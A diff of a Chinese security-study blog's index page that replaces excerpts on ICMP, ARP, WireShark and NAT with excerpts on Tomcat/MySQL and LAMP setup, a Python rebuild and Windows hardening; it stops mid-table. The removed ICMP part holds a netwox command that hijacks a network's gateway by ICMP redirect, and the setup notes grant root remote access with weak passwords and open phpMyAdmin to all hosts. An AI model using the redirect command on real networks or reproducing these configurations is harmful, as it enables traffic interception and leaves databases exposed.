+              <time title="创建时间：2023-06-27 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-27T00:00:00+08:00">2023-06-27</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -665,7 +570,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
                 </span>
             </span>
 
@@ -680,36 +585,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>1、理解ICMP协议</p>
-<ul>
-<li><p>Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。</p>
-</li>
-<li><p>ICMP基本概念</p>
-<ul>
-<li><p>网络层协议，封装在网络层和传输层之间</p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230321232207781.png" alt="image-20230321232207781"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230321231850530.png" alt="image-20230321231850530"></p>
-</li>
-</ul>
-</li>
-</ul>
-<p>2、理解ICMP重定向</p>
-<p>在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。</p>
-<ul>
-<li><p>重定向攻击</p>
-<ul>
-<li><p>kali上使用工具实施ICMP重定向网关</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netwox <span class="number">86</span> <span class="literal">-g</span> <span class="number">192.168</span>.<span class="number">198.128</span>  <span class="comment"># 把网络中的网关修改为192.168.198.128</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<p>3、会使用wireshark分析ICMP重定向</p>
-<p>实验条件</p>
-<p>kaili 地址 192.168.198.128</p>
-<p>win10地址 192.168.198.134</p>
+          <h3 id="Java-Tomcat环境"><a href="#Java-Tomcat环境" class="headerlink" title="Java_Tomcat环境"></a>Java_Tomcat环境</h3><p>Tomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。</p>
+<p>1、 单独安装Mysql5.6环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">wget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpm</span><br><span class="line">yum list installed | grep mysql</span><br><span class="line">rpm -qa|grep -i mariadb</span><br><span class="line">rpm -qa|grep mariadb|xargs rpm -e --nodeps</span><br><span class="line">rpm -qa|grep -i mariadb</span><br><span class="line">rpm -ivh mysql-community-release-el6-5.noarch.rpm</span><br><span class="line">yum repolist all | grep mysql</span><br><span class="line">yum install mysql-community-server</span><br><span class="line">systemctl status mysqld</span><br><span class="line">systemctl start mysqld</span><br><span class="line">systemctl status mysqld</span><br><span class="line">mysql -uroot</span><br><span class="line">    use mysql;</span><br><span class="line">    UPDATE user SET Password=PASSWORD(&#x27;123456&#x27;) WHERE User=&#x27;root&#x27;;</span><br><span class="line">    GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br><span class="line">    FLUSH privileges;</span><br><span class="line"></span><br><span class="line">systectl restart mysqld</span><br><span class="line"></span><br><span class="line"># 如果不小心改错了,以不验证模式启动Mysql</span><br><span class="line">systemctl stop mysqld</span><br><span class="line">mysqld_safe --skip-grant-tables  </span><br><span class="line">随后登录，更改</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2 .安装Tomcat 8.5 (java 已安装)</p>
+<p>下载链接 <a target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf apache-tomcat-8.5.90.tar.gz</span><br><span class="line">mv apache-tomcat-8.5.90 /opt</span><br><span class="line">echo &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">防火墙</span></span><br><span class="line">firewall-cmd --add-port=8080/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CATALINA_HOME/bin/startup.sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认配置文件</span></span><br><span class="line">/opt/apache-tomcat-8.5.90/conf/server.xml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">默认日志文件</span></span><br><span class="line">/opt/apache-tomcat-8.5.90/log/catalina.out</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问日志文件</span></span><br><span class="line">/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt</span><br></pre></td></tr></table></figure>
+
+<p>默认网站根目录如下</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230627232003484.png" alt="image-20230627232003484"></p>
+<p>数据库连接文件</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ICMP%E5%8D%8F%E8%AE%AE_new/#more" rel="contents">
+              <a class="btn" href="/2023/06/27/Web%E6%B8%97%E9%80%8F/Java_Tomcat%E7%8E%AF%E5%A2%83_new/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -733,7 +622,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/arp%E5%8D%8F%E8%AE%AE_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/06/27/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ubuntu%20%E5%B7%A5%E7%A8%8B%E8%BF%81%E7%A7%BB%E5%88%B0centos/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -747,7 +636,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/arp%E5%8D%8F%E8%AE%AE_new/" class="post-title-link" itemprop="url">arp协议</a>
+            <a href="/2023/06/27/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ubuntu%20%E5%B7%A5%E7%A8%8B%E8%BF%81%E7%A7%BB%E5%88%B0centos/" class="post-title-link" itemprop="url">ubuntu 工程迁移到centos</a>
         </h2>
 
         <div class="post-meta">
@@ -757,7 +646,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-20 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-20T00:00:00+08:00">2023-03-20</time>
+              <time title="创建时间：2023-06-27 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-27T00:00:00+08:00">2023-06-27</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -780,19 +669,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><h4 id="一、ARP协议"><a href="#一、ARP协议" class="headerlink" title="一、ARP协议"></a>一、ARP协议</h4><p>将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。</p>
-<h4 id="二、工作流程"><a href="#二、工作流程" class="headerlink" title="二、工作流程"></a>二、工作流程</h4><p>1、两个阶段</p>
-<ul>
-<li>ARP请求</li>
-<li>ARP响应</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320215353648.png" alt="image-20230320215353648"></p>
-<p>2、arp数据格式</p>
-<p>目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址   ）  </p>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320220140891.png" alt="image-20230320220140891"></p>
+          <p>Ubuntu上的环境迁移到Centos遇到的坑</p>
+<p>1、运行截图如下：</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202306271451615.png" alt="image-20230627145120473"></p>
+<p>2、后来发现环境是64位的，而实际运行环境是需要32位的python，重新下载编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载链接  https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tar.xz</span></span><br><span class="line"></span><br><span class="line">yum install glibc.i686 libgcc.i686 libstdc++.i686 zlib-devel.i686 ncurses-devel.i686 readline-devel.i686</span><br><span class="line">wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tar.xz</span><br><span class="line">tar -xvf Python-2.7.18.tar.xz </span><br><span class="line">cd Python-2.7.18</span><br><span class="line">yum install -y gcc make libc-dev</span><br><span class="line">yum install zlib-devel libffi-devel openssl-devel</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr/local/python32 </span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">export PATH=/usr/local/python32/bin:$PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/arp%E5%8D%8F%E8%AE%AE_new/#more" rel="contents">
+              <a class="btn" href="/2023/06/27/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/ubuntu%20%E5%B7%A5%E7%A8%8B%E8%BF%81%E7%A7%BB%E5%88%B0centos/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -816,7 +702,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/16/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/WireShark_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/06/24/Web%E6%B8%97%E9%80%8F/LAMP%E7%8E%AF%E5%A2%83_new/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -830,7 +716,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/16/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/WireShark_new/" class="post-title-link" itemprop="url">WireShark</a>
+            <a href="/2023/06/24/Web%E6%B8%97%E9%80%8F/LAMP%E7%8E%AF%E5%A2%83_new/" class="post-title-link" itemprop="url">LAMP环境</a>
         </h2>
 
         <div class="post-meta">
@@ -840,7 +726,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-16 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-16T00:00:00+08:00">2023-03-16</time>
+              <time title="创建时间：2023-06-24 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-24T00:00:00+08:00">2023-06-24</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -848,7 +734,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">黑客工具</span></a>
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
                 </span>
             </span>
 
@@ -863,30 +749,59 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>协议</p>
-<p>TCP&#x2F;IP 协议族</p>
+          <h3 id="Lampp环境"><a href="#Lampp环境" class="headerlink" title="Lampp环境"></a>Lampp环境</h3><p>1、基本概念与环境</p>
+<p>Linux+apache2+mysql+php+python</p>
+<p>Xmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。</p>
 <ul>
-<li>网络接口层   PPPOE<ul>
-<li>物理层</li>
-<li>数据链路层</li>
+<li>Xmapp 启动后，Apache 使用端口80，防火墙要放行</li>
 </ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd  --add-port=80/tcp  --permanent</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://ip/dashboard/phpinfo.php">http://ip/dashboard/phpinfo.php</a> 展示了所有运行环境参数，通常情况下，<em><strong>配置完成后要删除该页面</strong></em></p>
 </li>
-<li>网络层：IP　ARP　RARP ICMP IGMP </li>
-<li>传输层  TCP(传输控制协议) UDP（用户数据包协议）</li>
-<li>应用层  HTTP FTP  DNS DHCP HTTPS SMTP  POP IMAP   0-65535   0-1023</li>
-</ul>
-<h3 id="WireShark-流量抓取工具"><a href="#WireShark-流量抓取工具" class="headerlink" title="WireShark  流量抓取工具"></a>WireShark  流量抓取工具</h3><p>一、网卡</p>
-<p>对主机网卡上的数据流量进行抓取</p>
-<p>1、网卡模式</p>
+<li><p>默认情况下，&#x2F;opt&#x2F;lampp&#x2F;htdocs 目录是应用程序的根目录。</p>
+</li>
+<li><p>phpmyadmin 是mysql的网页端，<em><strong>默认情况下禁止远程访问</strong></em></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改/opt/lampp/etc/extra/httpd-xampp.conf</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释  Require <span class="built_in">local</span>  新增  Require all granted 即可运行远程访问</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">since XAMPP 1.4.3</span></span><br><span class="line">&lt;Directory &quot;/opt/lampp/phpmyadmin&quot;&gt;</span><br><span class="line">    AllowOverride AuthConfig Limit</span><br><span class="line">    # Require local</span><br><span class="line">    Require all granted</span><br><span class="line">    ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>确认服务和端口正常启动</p>
 <ul>
-<li>混杂模式  设置为混杂模式才可以抓取 </li>
-<li>非混杂模式（默认），不会接收目的非自己的数据</li>
+<li><p>修改默认端口，修改配置文件&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf，<em><strong>改成非80，更安全</strong></em></p>
+</li>
+<li><p>如果出现内核版本不兼容情况，修改&#x2F;opt&#x2F;lampp&#x2F;lampp ，将内核版本修改为2.8.0以上。</p>
+</li>
 </ul>
-<p>2、界面认识</p>
-<p>3、过滤器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_ASSUME_KERNEL=2.8.0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>部署对应的系统或者网站，导入数据库，修改配置文件等。</p>
+<p>注意配置数据库时</p>
+<ul>
+<li>修改root默认密码</li>
+<li>配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">默认数据库的user情况</span><br><span class="line">MariaDB [mysql]&gt; select User,Password,Host from user;</span><br><span class="line">+------+----------+-----------+</span><br><span class="line">| User | Password | Host      |</span><br><span class="line">+------+----------+-----------+</span><br><span class="line">| root |          | localhost |</span><br><span class="line">| root |          | 127.0.0.1 |</span><br><span class="line">| root |          | ::1       |</span><br><span class="line">|      |          | localhost |</span><br><span class="line">| root |          | %         |</span><br><span class="line">| pma  |          | localhost</span><br><span class="line"></span><br><span class="line">第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。</span><br><span class="line">第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。</span><br><span class="line">第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。</span><br><span class="line">第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。</span><br><span class="line">第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。</span><br><span class="line">第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 数据库，不需要密码。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>两种方式修改mysql的密码：</p>
+<p>第一种方式：</p>
+<p>phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin&#x2F;config.inc.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;654321&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230625225559571.png" alt="image-20230625225559571"></p>
+<p>第二种方式，默认空密码登陆后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot </span><br><span class="line">update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br><span class="line">update user set authentication_string=password(&#x27;qwe123&#x27;) where user=&#x27;root&#x27; and host=&#x27;127.0.0.1&#x27;;</span><br><span class="line">update user set authentication_string=password(&#x27;xxxxxx&#x27;) where user=&#x27;root&#x27; and host=&#x27;%&#x27;;</span><br><span class="line">flush privileges</span><br><span class="line"># 注意 authentication_string 在低版本是password ，在高版本是 authentication_string</span><br><span class="line">而不是下面的语句</span><br><span class="line">update user set password=&#x27;qwe123&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em><strong>安全起见，一般要禁用phpmyadmin</strong></em>，有三种方法</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/16/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/WireShark_new/#more" rel="contents">
+              <a class="btn" href="/2023/06/24/Web%E6%B8%97%E9%80%8F/LAMP%E7%8E%AF%E5%A2%83_new/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -910,7 +825,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/15/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/NAT_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/06/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF_new/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -924,7 +839,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/15/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/NAT_new/" class="post-title-link" itemprop="url">NAT</a>
+            <a href="/2023/06/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF_new/" class="post-title-link" itemprop="url">windows 服务器加固技术</a>
         </h2>
 
         <div class="post-meta">
@@ -934,7 +849,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-15 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-15T00:00:00+08:00">2023-03-15</time>
+              <time title="创建时间：2023-06-11 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-11T00:00:00+08:00">2023-06-11</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -957,49 +872,132 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>一、NAT基本概念</p>
-<p> 将私网IP地址转换为公网IP地址 </p>
-<p>1、转换方式</p>
+          <h3 id="Windows-服务器加固技术"><a href="#Windows-服务器加固技术" class="headerlink" title="Windows 服务器加固技术"></a>Windows 服务器加固技术</h3><h4 id="1、windows-常用命令"><a href="#1、windows-常用命令" class="headerlink" title="1、windows 常用命令"></a>1、windows 常用命令</h4><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ver</td>
+<td>查看系统版本</td>
+</tr>
+<tr>
+<td>hostname</td>
+<td>查看主机名</td>
+</tr>
+<tr>
+<td>ipconfig &#x2F;all</td>
+<td>查看网络配置</td>
+</tr>
+<tr>
+<td>net user&#x2F;localgroup&#x2F;share&#x2F;config</td>
+<td>查看用户&#x2F;用户组&#x2F;共享&#x2F;当前运行可配置服务</td>
+</tr>
+<tr>
+<td>at</td>
+<td>建立或查看系统作业</td>
+</tr>
+<tr>
+<td>netstat</td>
+<td>查看开放端口</td>
+</tr>
+<tr>
+<td>secpol.msc</td>
+<td>查看和修改本地安全设置</td>
+</tr>
+<tr>
+<td>services.msc</td>
+<td>查看和修改服务</td>
+</tr>
+<tr>
+<td>eventvwr.msc</td>
+<td>查看日志</td>
+</tr>
+<tr>
+<td>regedit</td>
+<td>打开注册表</td>
+</tr>
+<tr>
+<td>whoami</td>
+<td>查看当前操作用户的用户名</td>
+</tr>
+</tbody></table>
 <ul>
-<li><p>静态转换  仅针对IP地址转换 1对1</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source <span class="keyword">static</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">64.23</span>.<span class="number">12.34</span>	</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义内网范围</span></span><br><span class="line">access<span class="literal">-list</span> <span class="number">1</span> permit <span class="number">192.168</span>.<span class="number">10.0</span> <span class="number">0.0</span>.<span class="number">0.255</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义外网范围</span></span><br><span class="line">ip nat pool woniu <span class="number">23.24</span>.<span class="number">56.60</span> <span class="number">23.24</span>.<span class="number">56.61</span> netmask <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"><span class="comment">#应用</span></span><br><span class="line">ip nat inside source list <span class="number">1</span> pool woniu</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>端口多路复用PAT 多对1转，携带端口一起转换  192.168.1.1：8899 —》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网</p>
+<li><p>修改本地安全策略</p>
+<p>账户策略</p>
 <ul>
-<li><p>端口多路复用</p>
+<li>密码策略</li>
+<li>账户锁定策略</li>
+</ul>
+<p>本地策略</p>
 <ul>
-<li><p>内网的多个地址转换为外网的一个IP地址（端口一起转换）</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义内网范围</span></span><br><span class="line">access<span class="literal">-list</span> <span class="number">1</span> permit any</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义外网范围</span></span><br><span class="line">ip nat pool woniu <span class="number">23.24</span>.<span class="number">56.60</span> <span class="number">23.24</span>.<span class="number">56.60</span> netmask <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"><span class="comment">#应用</span></span><br><span class="line">ip nat inside source list <span class="number">1</span> pool woniu overload</span><br></pre></td></tr></table></figure>
-
-
+<li><p>审核策略	  -记录成日志</p>
 </li>
-<li><p>内网多个地址直接转换为外网接口的地址</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义内网范围</span></span><br><span class="line">access<span class="literal">-list</span> <span class="number">1</span> permit any</span><br><span class="line"></span><br><span class="line"><span class="comment">#应用</span></span><br><span class="line">ip nat inside source list <span class="number">1</span> int g0/<span class="number">1</span> overload</span><br></pre></td></tr></table></figure></li>
+<li><p>用户权限分配  </p>
+</li>
+<li><p>安全选项</p>
+</li>
 </ul>
 </li>
 </ul>
-</li>
-<li><p>端口映射(服务器映射)  -  只能外网访问内网</p>
+<h4 id="2、windows-常见端口"><a href="#2、windows-常见端口" class="headerlink" title="2、windows 常见端口"></a>2、windows 常见端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>80&#x2F;8080&#x2F;8081</td>
+<td>HTTP协议代理服务器常用端口号</td>
+</tr>
+<tr>
+<td>443</td>
+<td>HTTPS协议代理服务器常用端口号</td>
+</tr>
+<tr>
+<td>21</td>
+<td>FTP(文件传输协议)协议代理服务器常用端口号</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Telnet(远程登录)协议代理服务器常用端口号</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH（安全登录）、SCP（文件传输）</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle 数据库</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MS SQL SERVER数据库</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>QQ</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>Mysql数据库</td>
+</tr>
+<tr>
